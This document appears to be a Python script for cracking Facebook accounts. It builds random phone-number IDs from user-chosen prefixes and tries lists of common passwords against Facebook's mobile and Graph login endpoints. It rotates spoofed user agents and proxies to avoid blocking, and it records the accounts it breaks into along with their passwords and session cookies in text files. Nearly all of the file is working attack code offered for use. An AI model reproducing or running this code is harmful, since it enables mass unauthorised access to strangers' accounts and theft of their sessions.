# lempankkkkkkkk

ugen2=[]

ugen=[]

try:
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
	open('http.txt','w').write(prox)
except Exception as e:
	os.system ("clear")
prox=open('http.txt','r').read().splitlines()

for xd in range(10000):

	a='Mozilla/5.0 (Symbian/3; Series60/'

	b=random.randrange(1, 9)

	c=random.randrange(1, 9)

	d='Nokia'

	e=random.randrange(100, 9999)

	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

	g=random.randrange(1, 9)

	h=random.randrange(1, 4)

	i=random.randrange(1, 4)

	j=random.randrange(1, 4)

	k='Mobile Safari/535.1'

	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

	ugen2.append(uaku)

	aa='Mozilla/5.0 (Linux; U; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c=' en-us; GT-'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

	ugen.append(uaku2)

	
	
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/facebookweb/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

loop = 0
ok = []
methods = []
total=[]
android_models = []
abc = {'1':'a','2':'b','3':'c','4':'d','5':'e','6':'f','7':'g','8':'h','9':'i','10':'j','11':'k','12':'l','13':'m','14':'n','15':'o','16':'p','17':'q','18':'r','19':'s','20':'t','21':'u','22':'v','23':'w','24':'x','25':'y','26':'z','27':':','28':'/','29':'.','30':'279','31':'-','32':'*','33':'?','34':'=','35':'&'}

	
def cek_apk(session,coki):

	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

	sop = BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	if len(game)==0:

		print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))

	else:

		print(f'\r 🎮  %sYour Active Application Details :'%(H))

		for i in range(len(game)):

			print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

		#else:

			#print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

	sop = BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	if len(game)==0:

		print(f'\r %s[%s!%s] %sSorry no Expired Apk%s		   \n'%(N,M,N,M,N))

	else:

		print(f'\r 🎮  %sYour Expired Application Details :'%(M))

		for i in range(len(game)):

			print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

		else:

			print(f'\r')

			#print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))

loop = 0
Apk = []
oks = []
cps = []
				
def mrriaz():
	os.system('clear')
	print(logo)
	print('[1] Pak Random Cloning ')
	print('[2] B D Random Cloning  ')
	print('[3] Choice Pass Cloning')
	print('\x1b[1;91m[4]  Exit Programe')
	linex()
	riaz=input(' Select option : ')
	if riaz =='1':
		riaz1()
	if riaz =='2':
		riaz2()
	if riaz =='4':
		exit()
	if riaz =='3':
		choice()
	if riaz =='5':
		exit()
def riaz2():
	os.system('clear')
	print(logo)
	print('[1] Bangla Random Cloning')
	print('[2] India Random Cloning')
	print('\x1b[1;91m[3] Go to main menu')
	linex()
	riaz=input(' Select option : ')
	if riaz =='1':
		bd()
	if riaz =='2':
		india()
	if riaz =='3':
		menu()
def riaz1():
	os.system('clear')
	print(logo)
	print('[1] Random Cloning M [1] ')
	print('[2] Random Cloning M [2] ')
	print('[3] Random Cloning M [3] ')
	print('[4] Random Cloning M [4] ')
	print('[5] Random Cloning M [5]  ')
	print('\x1b[1;91m[6] Go to main menu')
	linex()
	riaz=input(' Select option : ')
	if riaz =='1':
		m1()
	if riaz =='2':
		m2()
	if riaz =='3':
		m3()
	if riaz =='4':
		m4()
	if riaz =='5':
		m5()
	if riaz =='6':
		menu()
def m1():
	uid=[]
	os.system('clear')
	print(logo)
	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
	linex()
	kode = input('[+]\033[1;37m Your Code : ')
	os.system('clear')
	print(logo)
	print('[•] Example : 1000,5000,100000,*****Etc ')
	linex()
	limit = int(input('[•] Your Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[•] Total Acounts : '+tl)
		print('[•] Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m[•] If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	linex()
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	linex()
	exit()
def m2():
	uid=[]
	os.system('clear')
	print(logo)
	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
	linex()
	kode = input('[+]\033[1;37m Your Code : ')
	os.system('clear')
	print(logo)
	print('[•] Example : 1000,5000,100000,*****Etc ')
	linex()
	limit = int(input('[•] Your Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[•] Total Acounts : '+tl)
		print('[•] Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m[•] If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'khan1122']
			yaari.submit(rcrack,uid,pwx,tl)
	linex()
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	linex()
	exit()
def m3():
	uid=[]
	os.system('clear')
	print(logo)
	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
	linex()
	kode = input('[+]\033[1;37m Your Code : ')
	os.system('clear')
	print(logo)
	print('[•] Example : 1000,5000,100000,*****Etc ')
	linex()
	limit = int(input('[•] Your Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[•] Total Acounts : '+tl)
		print('[•] Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m[•] If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru+kode,'khan12','khan1122','khan12345','khan123']
			yaari.submit(rcrack,uid,pwx,tl)
	linex()
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	linex()
	exit()
def m4():
	uid=[]
	os.system('clear')
	print(logo)
	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
	linex()
	kode = input('[+]\033[1;37m Your Code : ')
	os.system('clear')
	print(logo)
	print('[•] Example : 1000,5000,100000,*****Etc ')
	linex()
	limit = int(input('[•] Your Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[•] Total Acounts : '+tl)
		print('[•] Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m[•] If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'khan786','khan12345','khan123','khan1234','khan1122','janjan']
			yaari.submit(rcrack,uid,pwx,tl)
	linex()
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	linex()
	exit()
def m5():
	uid=[]
	os.system('clear')
	print(logo)
	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
	linex()
	kode = input('[+]\033[1;37m Your Code : ')
	os.system('clear')
	print(logo)
	print('[•] Example : 1000,5000,100000,*****Etc ')
	linex()
	limit = int(input('[•] Your Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[•] Total Acounts : '+tl)
		print('[•] Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m[•] If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'baloch','malik786','baloch123','khan12345','khan123','afghan123','pubg123']
			yaari.submit(rcrack,uid,pwx,tl)
	linex()
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	linex()
	exit()

#___xhoice pass____
def choice():
    uid=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
    linex()
    code = input('[•] PUT CODE : ')
    os.system('clear')
    print(logo)
    print('[•] Example : 1000,5000,100000,*****Etc ')
    linex()
    limit = int(input('[•] Your Idz lemit :  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    os.system("clear")
    print(logo)
    print('[•] Example : 1/ 2/ 3/ 4/ 5/ 6/ 7/ 8/ 9**ETC ')
    linex()
    passx = int(input("[•] Enter Password Limit : "))
    PROID = []
    os.system('clear')
    print(logo)
    print('[•] Example : khankhan,baloch,khan786,mlik786**Etc')
    linex()
    for riaz in range(passx):
        pww = input(f"[•] Enter Password {riaz+1} : ")
        mrriaz.append(pww)
    with ThreadPool(max_workers=50) as yaari: 	        
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('[•] Total Acounts : '+tl)
        print('[•] Selected Code : \x1b[1;92m'+code)
        print('\x1b[1;91m[•] If you no result use flight mode')
        linex()
        for love in uid:
            pwx = [love[1:]]
            uid = code+love
            for PRO in mrriaz:
                pwx.append(PRO)
                pwx.append(love)
            yaari.submit(rcrack,uid,pwx,tl)
#_______
def india():
	uid=[]
	os.system('clear')
	print(logo)
	print('\033[1;31m[•] NOT : PUT 977,978,990,663,667,778 etc')
	linex()
	kode = input('\033[1;37m[•] Put  Your Country Code: ')
	os.system('clear')
	print(logo)
	limit = int(input('[+] Your Idz lemit : '))
	linex()
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[•] Total Acounts : '+tl)
		print('[•] Selected Code : \x1b[1;92m'+code)
		print('\x1b[1;91m[•] If you no result use flight mode')
		linex()
		for guru in uid:
			uid = '+91'+kode+guru
			aj = uid[0:6]
			aja = uid[0:8]
			pwx = [guru,kode+guru,aj,aja]
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(47*'-')
	facebookweb()
def bd():
	uid=[]
	os.system('clear')
	print(logo)
	print('\033[1;31m[•] NOT : PUT 130,131,141etc')
	linex()
	kode = input('[+]\033[1;36m Put  Your Country Code: ')
	os.system('clear')
	print(logo)
	limit = int(input('[+] Your Idz lemit : '))
	linex()
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[•] Total Acounts : '+tl)
		print('[•] Selected Code : \x1b[1;92m'+code)
		print('\x1b[1;91m[•] If you no result use flight mode')
		linex()
		for guru in uid:
			uid = '+880'+kode+guru
			pwx = [guru,kode+guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(47*'-')
	facebookweb()
def rcrack(uid,pwx,tl):
	#print(uid)
	global loop
	global cps
	global oks
	try:
		for ps in pwx:
			
			session = requests.Session()
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {
			'authority': 'm.facebook.com',
			'method': 'GET',
			'path': '/login/device-based/login/async/',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://x.facebook.com',
			'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="99", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Andriod"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': "Mozilla/5.0 (Linux; Android 11; SM-M127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;]"}
			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[PRO-OK] '+cid+' | '+ps+'\n\033[0;92m[•] COOKIES : '+coki+'\x1b[1;97m')
				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\033[1;96m[PRO-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\033[1;97m[PRO-XD] [%s/%s] OK:- %s CP:- %s \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass

####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0




###USERAGENTSGEN####
'''
Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2555.106 Mobile Safari/537.36

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = []

import requests
rs = requests.get
ua = []

del ua
"""
Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
"""

ua=[]

##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	




     
l = []

##--------
def file():
    os.system("clear")
    print(logo)
    if 'PRO' in l:
        riaz2 = 'mr.riaz'
    else:
        riaz2 = input(f"[+]Enter File: ")
    try:
        for x in open(riaz2,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"File Not Found");time.sleep(1)
        riaz()
     
    method()
    exit()
    
            
   





####
"""
Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2821.146 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2438.124 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2325.100 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.2737.108 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2691.103 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2694.86 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.2854.131 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2746.80 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2684.125 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2458.89 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2516.140 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2692.150 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2722.79 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2888.86 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.2348.116 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2755.98 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2742.149 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2304.134 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2698.140 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2409.115 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.2851.96 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2673.94 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2376.82 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2641.83 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2869.130 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2500.149 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2875.109 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2635.124 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2692.123 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2591.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.2723.120 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.2468.108 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2731.138 Mobile Safari/537.36
"""
####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'[+] how many password do ypu want to add :? ')
        if lp.isnumeric():
            clear()
            ex = 'firstlast first123 last123'
            print(f'\x1b[1;92m[+]Example : {ex} Etc')
            linex()
            for x in range(int(lp)):
                totalpass.append(input(f'{(x+1)}\x1b[1;97mPassword : '))
            pass
        else:
            print(f"{('!')}Numeric Only")
            exit()
    clear()
    print(f''+("[1] ")+'Method [1]\n'+("[2] ")+'Method [2]')
    linex()
    m=input(f"{('!')}Input : ") 
    clear()
    print(''+("[•] ")+'Do You Want To Show Cp Ids?(y/n)')
    linex()
    cpok=input(f"{('!')}Input : ")
    clear()
    print(''+("[•] ")+'Do You Want To Show Cookies?(y/n)')
    linex()
    c=input(f"{('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print(f'[•] Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"\033[1;91m[•] If you no result use flight mode")
    linex()
    
    def method1(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r \033[1;97m[\033[1;97mPRO-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "Mozilla/5.0 (Linux; Android 13; linux Build/TP1A.220624.047; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4043.209 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/314.1.0.16.127;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m [PRO-OK] '+acc+'| '+pword+'')
                open('/sdcard/PRO-OK.txt','a').write(f'{acc}|{pword}\n ')
                if c=='y':
                    try:
                           q = json.loads(response.text)
